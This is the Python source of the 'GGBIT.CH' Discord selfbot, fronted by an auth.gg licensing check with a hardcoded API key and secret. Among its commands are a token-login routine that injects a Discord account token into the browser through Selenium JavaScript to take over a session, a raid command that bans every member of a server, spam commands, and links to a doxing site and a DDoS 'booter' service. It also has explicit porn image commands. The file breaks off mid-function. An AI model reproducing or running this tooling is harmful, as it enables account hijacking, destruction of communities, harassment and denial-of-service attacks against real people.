

import os
import time
import requests
import subprocess
import tkinter
from tkinter import messagebox
import sys
import hashlib
import discord, ctypes, json, os, webbrowser, requests, datetime, urllib, time, string, random, asyncio, aiohttp
from discord.ext import commands
from colorama import Fore, Back, Style
from selenium import webdriver
import threading


#if crack you gay


    


import subprocess, requests, time, os

root = tkinter.Tk()
root.withdraw()
hwid = str(subprocess.check_output('wmic csproduct get uuid')).split('\\r\\n')[1].strip('\\r').strip()
BUF_SIZE = 65536
md5 = hashlib.md5()
clear = lambda: os.system('cls')
try:
    with open(sys.argv[0], 'rb') as f:
        while True:
            data = f.read(BUF_SIZE)
            if not data:
                break
            md5.update(data)
except:
    messagebox.showerror('Ethereal | Licensing System', 'Hash Calculating Failed')
    os._exit(0)
filehash = md5.hexdigest()

login_status = 0
register_status = 0
apikey = "93372266391591392659987545714231651895864763"
secret = "UQsHN5ILimQN0gNZoTSoZ51l0VTSAnP0SLR"
aid = "96630"
version = "1.0"
random = "python"

def main():
    clear()
    os.system("mode con: cols=120 lines=21")
    ctypes.windll.kernel32.SetConsoleTitleW(f"GGBIT.CH Selfbot | | Auth")
    print(f'''

                                           ╔╗ ╔╗ ╔═╗╦╔╦╗╔═╗╦ ╦  ╔═╗╦ ╦╔╦╗╦ ╦
                                           {Fore.BLACK}{Style.BRIGHT}╠╩╗╠╩╗║ ╦║ ║ ║  ╠═╣  ╠═╣║ ║ ║ ╠═╣{Style.RESET_ALL}{Fore.RESET} 
                                           {Fore.RED}╚═╝╚═╝╚═╝╩ ╩o╚═╝╩ ╩  ╩ ╩╚═╝ ╩ ╩ ╩{Fore.RESET}
                                           
                                           ╔═══════════════════════════════╗
                                           ║{Fore.RED}[{Fore.RESET}1{Fore.RED}]{Fore.RESET} Login                      ║ 
                                           ║{Fore.RED}[{Fore.RESET}2{Fore.RED}]{Fore.RESET} Register                   ║ 
                                           ║{Fore.RED}[{Fore.RESET}3{Fore.RED}]{Fore.RESET} Extend Subscription        ║ 
                                           ╚═══════════════════════════════╝
    	''')     
     
    option = input(f"\n{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} ")
    if option == "1":
        login()
    elif option == "2":
        register()
    elif option == "3":
        redeem()
    else:
        print(f"\n{Fore.RED}[{Fore.RESET}!{Fore.RED}]{Fore.RESET} Invalid Option")
        time.sleep(2)
        os._exit(0)


def integrity_check():
    global login_status, register_status
    headers = {"User-Agent": "AuthGG"}
    data = {
        "type": "start",
        "random": random,
        "secret": secret,
        'aid': aid,
        'apikey': apikey
    }
    try:
        with requests.Session() as sess:
            request_1 = sess.post("https://api.auth.gg/version2/api.php", data=data, headers=headers)
            if request_1.json()["status"] == 'Failed':
                messagebox.showerror("Ethereal Licensing System", "This application is disabled!")
                os._exit(0)
            if request_1.json()['status'] == "Disabled":
                messagebox.showerror("Ethereal | Licensing System", "This application is disabled!")
                os._exit(0)
            if request_1.json()['developermode'] == 'Disabled':
                if request_1.json()['version'] != version:
                    messagebox.showinfo("Ethereal | Licensing System", "Update [{}] is available!".format(request_1.json()['version']))
                    os.system('start {}'.format(request_1.json()['downloadlink']))
                    os._exit(0)
                if request_1.json()['hash'] != filehash:
                    messagebox.showerror("Ethereal | Licensing System", "Hashes do not match, file tampering possible!")
                    os._exit(0)
                if request_1.json()['login'] != "Enabled":
                    login_status = 1
                if request_1.json()['register'] != "Enabled":
                    register_status = 1
            else:
                pass
    except:
            messagebox.showerror("Ethereal Licensing System", "Something went wrong!")
            os._exit(0)     
def login():
    if login_status == 0:
        os.system('cls')
        os.system("title Login Menu")
        username = input(f"{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} Enter Username: ")
        password = input(f"{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} Enter Password: ")
        data = {
            "type": "login",
            "aid": aid,
            "random": random,
            'apikey': apikey,
            "secret": secret,
            "username": username,
            "password": password,
            "hwid": hwid
        }
        headers = {"User-Agent": "AuthGG"}
        try:
            with requests.Session() as sess:
                request_2 = sess.post('https://api.auth.gg/version2/api.php', headers=headers, data=data)
                if "success" in request_2.text:
                    print("\n[!] Successfully logged into {}!".format(username))
                    time.sleep(2)
                    pass
                else:
                    if "invalid_details" in request_2.text:
                        print("\n[!] Please check your credentials!")
                    elif "invalid_hwid" in request_2.text:
                        print("\n[!] Invalid HWID, please do not attempt to share accounts!")
                    elif "hwid_updated" in request_2.text:
                        print("\n[!] Your HWID has been updated, relogin!")
                    elif "time_expired" in request_2.text:
                        print("\n[!] Your subscription has expired!")
                    elif "net_error" in request_2.text:
                        print("\n[!] Something went wrong!")
                    else:
                        print("\n[!] Something went wrong!")
                    time.sleep(2)
                    os._exit(0)

        except:
            messagebox.showerror("Ethereal Licensing System", "Something went wrong!")
            os._exit(0) 
    else:
        messagebox.showerror("Ethereal Licensing System", "Login is not available at this time!")
        os._exit(0)  
def register():
    os.system('cls')
    os.system("title Register Menu")
    if register_status == 0:
        token = input(f"{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} Please enter token: ")
        email = input(f"{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} Please enter email: ")
        username = input(f"{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} Please enter username: ")
        password = input(f"{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} Please enter password: ")
        headers = {"User-Agent": "AuthGG"}
        data = {
            "type": "register",
            "aid": aid,
            "random": random,
            'apikey': apikey,
            "secret": secret,
            "username": username,
            "password": password,
            "email": email,
            "token": token,
            "hwid": hwid
        }
        try:
            with requests.Session() as sess:
                request_3 = sess.post('https://api.auth.gg/version2/api.php', data=data, headers=headers)
                if "success" in request_3.text:
                    print("\n[!] {}, you have successfully registered!".format(username))
                    time.sleep(2)
                    os._exit(0)
                else:
                    if "invalid_token" in request_3.text:
                        print("\n[!] Token invalid or already used")
                    elif "invalid_username" in request_3.text:
                        print("\n[!] Username already taken, please choose another one")
                    elif "email_used" in request_3.text:
                        print('\n[!] Email is invalid or in use!')
                    else:
                        print("\n[!] Something went wrong!")
                    time.sleep(2)
                    os._exit(0)
        except:
            messagebox.showerror("Ethereal Licensing System", "Something went wrong!")
            os._exit(0)      
    else:
        messagebox.showerror("Ethereal Licensing System", "Register is not available at this time!")
        os._exit(0)  
def redeem():
    os.system('cls')
    os.system("title Redeem Menu") 
    username = input(f"{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} Enter Username: ")
    password = input(f"{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} Enter Password: ")
    token = input(f"{Fore.RED}[{Fore.RESET}?{Fore.RED}]{Fore.RESET} Please enter token: ")
    headers = {"User-Agent": "AuthGG"}
    data = {
            "type": "redeem",
            "aid": aid,
            "random": random,
            'apikey': apikey,
            "secret": secret,
            "username": username,
            "password": password,
            "token": token,
    }
    try:
        with requests.Session() as sess:
            request_4 = sess.post("https://api.auth.gg/version2/api.php", data=data, headers=headers)
            if "success" in request_4.text:
                print("\n[!] Successfully redeemed license & extended subscription!")
            elif "invalid_token" in request_4.text:
                print('\n[!] Invalid Credentials!')
            elif "net_error" in request_4.text:
                print('\n[!] Something went wrong!')
            time.sleep(2)
            os._exit(0)
    except:
        messagebox.showerror("Ethereal Licensing System", "Something went wrong!")
        os._exit(0)
            
                
integrity_check()
main()









VERSION = "1.0.0"
TOTAL_COMMANDS = "37"
TOTAL_LINES = "409"

import discord, ctypes, json, os, webbrowser, requests, datetime, urllib, time, string, random, asyncio, aiohttp
from discord.ext import commands
from colorama import Fore, Back, Style
from selenium import webdriver
import threading





    


import subprocess, requests, time, os

hwid = subprocess.check_output('wmic csproduct get uuid').decode().split('\n')[1].strip()

import socket

hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)







with open("config.json") as f:
    config = json.load(f)

TOKEN = config.get("token")
PREFIX = config.get("prefix")


def ready():
    print(f"""


                                      ╔═╗╔═╗╔╗ ╦╔╦╗╔═╗╦ ╦  ╔═╗╔═╗╦  ╔═╗╔╗ ╔═╗╔╦╗
                                      {Fore.BLACK}{Style.BRIGHT}║ ╦║ ╦╠╩╗║ ║ ║  ╠═╣  ╚═╗║╣ ║  ╠╣ ╠╩╗║ ║ ║{Style.RESET_ALL}{Fore.RESET} 
                                      {Fore.RED}╚═╝╚═╝╚═╝╩ ╩o╚═╝╩ ╩  ╚═╝╚═╝╩═╝╚  ╚═╝╚═╝ ╩{Fore.RESET} 
                                               

                                ════════════════════════════════════════════════════
                                Prefix {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}                                               
                                Servers{Fore.RED}[{Fore.RESET}{len(ggbitches.guilds)}{Fore.RED}]{Fore.RESET}                      
                                Friends{Fore.RED}[{Fore.RESET}{len(ggbitches.user.friends)}{Fore.RED}]{Fore.RESET}   
                                BotUser{Fore.RED}[{Fore.RESET}{ggbitches.user.name}{Fore.RED}]{Fore.RESET}
                                BotUsersHWID{Fore.RED}[{Fore.RESET}{hwid}{Fore.RED}]{Fore.RESET}     
                                ════════════════════════════════════════════════════ 
                                Help commands:
                                {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}help
                                {Fore.RED}[{Fore.RESET}{PREFIX}{Fore.RED}]{Fore.RESET}shelp
                                ════════════════════════════════════════════════════ 

    """+Fore.RESET)

def Nitro():
    code = "".join(random.choices(string.ascii_letters + string.digits, k=16))
    return f"https://discord.gift/{code}"

def RandomColor(): 
    randcolor = discord.Color(random.randint(0x000000, 0xFFFFFF))
    return randcolor

def RandString():
    return "".join(random.choice(string.ascii_letters + string.digits) for i in range(random.randint(4, 4)))

client = commands.Bot(
    command_prefix=PREFIX,
    self_bot=True
)
ggbitches = client
client.remove_command('help')

@ggbitches.event
async def on_message_edit(before, after):
    await ggbitches.process_commands(after)

@ggbitches.event
async def on_connect():
    os.system("mode con: cols=120 lines=21")
    ctypes.windll.kernel32.SetConsoleTitleW(f"GGBIT.CH Selfbot | | Logged In As: {ggbitches.user.name}")
    ready()



#=================================| Help Commands |=================================#

@ggbitches.group(invoke_without_command=True)
async def help(ctx):
    em = discord.Embed(title = "💉GGBIT.CH SELFBOT", color = RandomColor())

    em.add_field(name = "| 💉Fun commands |", value="8ball, ascii, slap, hug, kiss, cat, dog, panda, meme, blank, nitro")
    em.add_field(name = "| 💉Raid commands |", value="fullnuke, fulldelete, banall, rolecreate, channelcreate, channeldelete, roledelete, ")
    em.add_field(name = "| 💉Spam commands |", value="blankspam, numberspam, emojispam, crashspam, embedspam, memespam, hentaispam, pinguser, silentping")
    em.add_field(name = "| 💉Extra commands |", value="spoiler, streaming, playing, listening, watching, tinyurl, btc, eth, usdbtc, eurbtc, usdetc, euretc")
    em.add_field(name = "| 💉Helpful commands |", value="purge, guildicon, av, copy, clear")
    em.add_field(name = "| 💉Hacking |", value="login, logout, dox")
    em.add_field(name = "| 💉DDoS |", value="ping, booter, weakdns, whitepages, geo")
    em.add_field(name = "| 💉Porn |", value="hentai, pussy, tits, waifu, fox, hentaigif, pussygif, cumgif, kunigif")
    em.add_field(name = "| 💉Server builder |", value="serverbuilder")
    em.add_field(name = "| 💉Prefix |", value=PREFIX+ " " + "+ command")
    em.add_field(name = "| 💉Credits |", value="Made by InsainBoy and THC4L")
    em.add_field(name = "| 💉Website |", value="||https://ggbit.ch/||")




    await ctx.send(embed = em)

@ggbitches.group(invoke_without_command=True)
async def shelp(ctx):
    em = discord.Embed(title = "💉GGBIT.CH SELFBOT", description = "Use >help <command> for extended information on a command.",color = RandomColor())

    em.add_field(name = "| 💉Fun commands |", value="fun")
    em.add_field(name = "| 💉Raid commands |", value="raid")
    em.add_field(name = "| 💉Spam commands |", value="spam")
    em.add_field(name = "| 💉Extra commands |", value="extra")
    em.add_field(name = "| 💉Helpful commands |", value="helpful")
    em.add_field(name = "| 💉Hacking |", value="hacking")
    em.add_field(name = "| 💉DDoS |", value="ddos")
    em.add_field(name = "| 💉Porn |", value="hentaiporn")
    em.add_field(name = "| 💉Server builder |", value="serverbuilder")
    em.add_field(name = "| 💉Credits |", value="made by InsainBoy and THC4L")
    em.add_field(name = "| 💉Website |", value="||https://ggbit.ch/||")





    await ctx.send(embed = em)



#=================================| Fun Commands |=================================#

@ggbitches.command(name='8ball')
async def _ball(ctx, *, question):
    responses = [
        'As I see it, yes.',
        'Ask again later.',
        'Better not tell you now.',
        'Cannot predict now.',
        'Concentrate and ask again.',
        'Don’t count on it.',
        'It is certain.',
        'It is decidedly so.',
        'Most likely.',
        'My reply is no.',
        'My sources say no.',
        'Outlook not so good.',
        'Outlook good.',
        'Reply hazy, try again.',
        'Signs point to yes.',
        'Very doubtful.',
        'Without a doubt.',
        'Yes.',
        'Yes – definitely.',
        'You may rely on it.'
    ]
    answer = random.choice(responses)
    embed = discord.Embed(color=RandomColor())
    embed.add_field(name="**Question:**", value=f"```{question}```", inline=False)
    embed.add_field(name="**Answer:**", value=f"```{answer}```", inline=False)
    embed.set_author(name="8 Ball Machine", icon_url="https://cdn.nekos.life/8ball/Absolutely.png") 
    await ctx.send(embed=embed)

@ggbitches.command()
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f"http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}").text
    if len("```"+r+"```") > 2000:
        return
    await ctx.send(f"```{r}```")

@ggbitches.command()
async def slap(ctx, user: discord.Member):
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    embed = discord.Embed(description=f"**{ctx.author.mention} Slaps {user.mention}**", color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)

@ggbitches.command()
async def hug(ctx, user: discord.Member):
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    embed = discord.Embed(description=f"**{ctx.author.mention} Hugs {user.mention}**", color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)

@ggbitches.command()
async def kiss(ctx, user: discord.Member):
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    embed = discord.Embed(description=f"**{ctx.author.mention} Kisses {user.mention}**", color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)

@ggbitches.command()
async def cat(ctx):
    r = requests.get("https://some-random-api.ml/img/cat").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Cat You Requested", icon_url="https://i.stack.imgur.com/DTCra.png") 
    embed.set_image(url=str(r["link"]))
    await ctx.send(embed=embed)

@ggbitches.command()
async def dog(ctx):
    r = requests.get("https://some-random-api.ml/img/dog").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Dog You Requested", icon_url="http://clipart-library.com/images_k/dog-bone-silhouette/dog-bone-silhouette-1.png") 
    embed.set_image(url=str(r["link"]))
    await ctx.send(embed=embed)

@ggbitches.command()
async def panda(ctx):
    r = requests.get("https://some-random-api.ml/img/panda").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Panda You Requested", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    embed.set_image(url=str(r["link"]))
    await ctx.send(embed=embed)

@ggbitches.command()
async def meme(ctx):
    r = requests.get("https://some-random-api.ml/meme").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here Is The Meme You Requested", icon_url="https://freepngimg.com/thumb/internet_meme/3-2-troll-face-meme-png-thumb.png") 
    embed.set_image(url=str(r["image"]))
    await ctx.send(embed=embed)

@ggbitches.command()
async def blank(ctx):
    await ctx.message.delete()
    await ctx.send("ﾠﾠ"+"\n" * 400 + "ﾠﾠ")

@ggbitches.command()
async def nitro(ctx):
    await ctx.message.delete()
    await ctx.send(Nitro())




#=================================| Hacking Commands |=================================#

@ggbitches.command()
async def login(ctx, usertoken):
    await ctx.message.delete()
    options = webdriver.ChromeOptions()
    options.add_experimental_option("detach", True)
    driver = webdriver.Chrome(options=options, executable_path=r"chromedriver.exe")
    script = """
            function login(token) {
            setInterval(() => {
            document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token = `"${token}"`
            }, 50);
            setTimeout(() => {
            location.reload();
            }, 2500);
            }   
            """
    driver.get("https://discordapp.com/login")
    driver.execute_script(script+f'\nlogin("{usertoken}")')

@ggbitches.command()
async def logout(ctx):
    await ctx.message.delete()
    await ggbitches.logout()

@ggbitches.command()
async def dox(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your doxer") 
    await ctx.send(embed=embed)
    await os.system('start https://doxbin.org')

#server builder

@ggbitches.command()
async def buildtemplate1(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.new/NxSj7Z5jhV83')

@ggbitches.command()
async def buildtemplate2(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.com/template/WRp8JrT37kkc')

@ggbitches.command()
async def buildtemplate3(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.com/template/Wx8CkEV6b7BN')

@ggbitches.command()
async def buildtemplate4(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.com/template/8Pq7aTucMTd6')

@ggbitches.command()
async def buildtemplate5(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.com/template/XpqYx5asn3UT')

@ggbitches.command()
async def buildtemplate6(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.com/template/3Mv9YjYySCQW')

@ggbitches.command()
async def buildtemplate7(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.com/template/PzyTmafcuzDJ')

@ggbitches.command()
async def buildtemplate8(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.com/template/n7cKgN6VkH6w')

@ggbitches.command()
async def buildtemplate9(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.com/template/zcPYVPy4uq4S')

@ggbitches.command()
async def buildtemplate10(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="💉 Server builder by GGBIT.CH has been opened, look at your browser 💉", icon_url="https://cdn.freebiesupply.com/logos/large/2x/panda-7-logo-png-transparent.png") 
    await ctx.send(embed=embed)
    await os.system('start https://discord.com/template/AzhSzjMR3pkk')



#=================================| DDoS Commands |=================================#
@ggbitches.command()
async def ping(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your pinger") 
    await ctx.send(embed=embed)
    await os.system('start https://www.ipvoid.com/ping/o')
    


@ggbitches.command()
async def booter(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your booter") 
    await ctx.send(embed=embed)
    await os.system('start https://stresser.net')

@ggbitches.command()
async def weakdns(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your weakdns") 
    await ctx.send(embed=embed)
    await os.system('start https://stresser.net/login')


@ggbitches.command()
async def whitepages(ctx):
    await ctx.message.delete()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="Here is your whitepages") 
    await ctx.send(embed=embed)
    await os.system('start https://www.whitepages.com')


@ggbitches.command()
async def geo(ctx, host):
    start = datetime.datetime.now()
    r = requests.get(f"http://ip-api.com/json/{host}?fields=country,regionName,city,isp,mobile,proxy,query")
    geo = r.json()
    query = geo["query"]
    isp = geo["isp"]
    city = geo["city"]
    region = geo["regionName"]
    country = geo["country"]
    proxy = geo["proxy"]
    mobile = geo["mobile"]
    elapsed = datetime.datetime.now() - start
    elapsed = f"{elapsed.seconds}.{elapsed.microseconds}"
    embed = discord.Embed(description=f"**Host:** {query}\n**ISP:** {isp}\n**City:** {city}\n**Region:** {region}\n**Country:** {country}\n**VPN/Proxy:** {proxy}\n**Mobile:** {mobile}", color=RandomColor())
    embed.set_author(name=f"Geo Lookup For {query}")
    embed.set_footer(text=f"Resolved In {elapsed} Seconds")
    await ctx.send(embed=embed)



#=================================| Images |=================================#



@ggbitches.command()
async def hentai(ctx):
    r = requests.get("https://nekos.life/api/v2/img/hentai")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)



@ggbitches.command()
async def waifu(ctx):
    r = requests.get("https://nekos.life/api/v2/img/waifu")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)



@ggbitches.command()
async def fox(ctx):
    r = requests.get("https://nekos.life/api/v2/img/fox_girl")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)


@ggbitches.command()
async def tits(ctx):
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)


@ggbitches.command()
async def pussy(ctx):
    r = requests.get("https://nekos.life/api/v2/img/pussy_jpg")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)

#=================================| Gif |=================================#


@ggbitches.command()
async def hentaigif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)


@ggbitches.command()
async def boobsgif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)


@ggbitches.command()
async def pussygif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/pussy")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)


@ggbitches.command()
async def cumgif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/cum")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)


@ggbitches.command()
async def kunigif(ctx):
    r = requests.get("https://nekos.life/api/v2/img/kuni")
    res = r.json()
    embed = discord.Embed(color=RandomColor())
    embed.set_image(url=res["url"])
    await ctx.send(embed=embed)

#=================================| Extra Commands |=================================#


@ggbitches.command()
async def spoiler(ctx, *, message):
    await ctx.message.delete()
    await ctx.send(f"||{message}||")

    
@ggbitches.command()
async def streaming(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="", 
    )
    await ggbitches.change_presence(activity=stream)    

@ggbitches.command()
async def playing(ctx, *, message):
    await ctx.message.delete()
    game = discord.Game(
        name=message
    )
    await ggbitches.change_presence(activity=game)

@ggbitches.command()
async def listening(ctx, *, message):
    await ctx.message.delete()
    await ggbitches.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message, 
        ))

@ggbitches.command()
async def watching(ctx, *, message):
    await ctx.message.delete()
    await ggbitches.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.watching, 
            name=message
        ))  

@ggbitches.command()
async def tinyurl(ctx, *, link):
    await ctx.message.delete()
    r = requests.get(f"http://tinyurl.com/api-create.php?url={link}").text
    await ctx.send(f"{r}")

@ggbitches.command(aliases=["bitcoin"])
async def btc( ctx):
    """Gets the current Bitcoin Price"""
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR,GBP"
    )
    r = r.json()
    usd = r["USD"]
    eur = r["EUR"]
    gbp = r["GBP"]
    em = discord.Embed(
        description=f"USD: `{str(usd)}$`\n\nEUR: `{str(eur)}€`\n\nGBP: `{str(gbp)}£`"
    )
    em.set_author(
        name="Bitcoin",
        icon_url="https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png",
    )
    await ctx.send(embed=em)
    ### I hope this code is so horrible I'm never allowed to code embeds again

@ggbitches.command(aliases=["ethereum"])
async def eth(ctx):
    """Gets the current Etherium price"""
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR,GBP"
    )
    r = r.json()
    usd = r["USD"]
    eur = r["EUR"]
    gbp = r["GBP"]
    em = discord.Embed(
        description=f"USD: `{str(usd)}$`\nEUR: `{str(eur)}€`\n\nGBP: `{str(gbp)}£`"
    )
    em.set_author(
        name="Ethereum",
        icon_url="https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png",
    )
    await ctx.send(embed=em)

@ggbitches.command(aliases=["usdtobtc", "usd2btc"])
async def usdbtc(ctx, message):
    """Converts USD to BTC

    Parameters
       • USD - Amount of USD you want in BTC (NOTE: NEEDS TO BE WHOLE NUMBER)
     """
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD"
    )

    r = r.json()
    usd = r["USD"]
    index = 1 / usd
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}$** = **{converted} BTC**")
    em.set_author(
        name="USD to Bitcoin",
        icon_url="https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png",
    )
    await ctx.send(embed=em)


@ggbitches.command(aliases=["eurtobtc", "eur2btc"])
async def eurbtc(ctx, message):
    """Converts EUR to BTC

    Parameters
       • EUR - Amount of USD you want in BTC (NOTE: NEEDS TO BE WHOLE NUMBER)
     """
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=EUR"
    )

    r = r.json()
    eur = r["EUR"]
    index = 1 / eur
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}€** = **{converted} BTC**")
    em.set_author(
        name="EUR to Bitcoin",
        icon_url="https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png",
    )
    await ctx.send(embed=em)

@ggbitches.command(aliases=["usdtoeth", "usd2eth"])
async def usdeth(ctx, message):
    """Converts USD to ETH

    Parameters
    • USD - Amount of USD you want in ETH (NOTE: NEEDS TO BE WHOLE NUMBER)
    """
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD"
    )

    r = r.json()
    usd = r["USD"]
    index = 1 / usd
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}$** = **{converted} ETH**")
    em.set_author(
        name="USD to ETH",
        icon_url="https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png",
    )
    await ctx.send(embed=em)

@ggbitches.command(aliases=["eurtoeth", "eur2eth"])
async def eureth(ctx, message):
    """Converts EUR to ETH

    Parameters
    • USD - Amount of USD you want in ETH (NOTE: NEEDS TO BE WHOLE NUMBER)
    """
    await ctx.message.delete()
    r = requests.get(
        "https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=EUR"
    )

    r = r.json()
    eur = r["EUR"]
    index = 1 / eur
    amount = int(message)
    converted = amount * index
    em = discord.Embed(description=f"**{amount}£** = **{converted} ETH**")
    em.set_author(
        name="EUR to ETH",
        icon_url="https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png",
    )
    await ctx.send(embed=em)

#=================================| Raid Commands |=================================#

@ggbitches.command()
async def banAll(ctx):
    """Bans all members in the guild the command is used"""
    await ctx.message.delete()
    for member in ctx.guild.members:
        try:
            await member.ban()
        except Exception as e:
            print(
                f"{Fore.RED}[-]banAll => {Fore.RESET}Failed to ban {member}\n{e}\n"
            )

@ggbitches.command()
async def rolecreate(ctx):
    await ctx.message.delete()
    for i in range(1, 25):
        try:
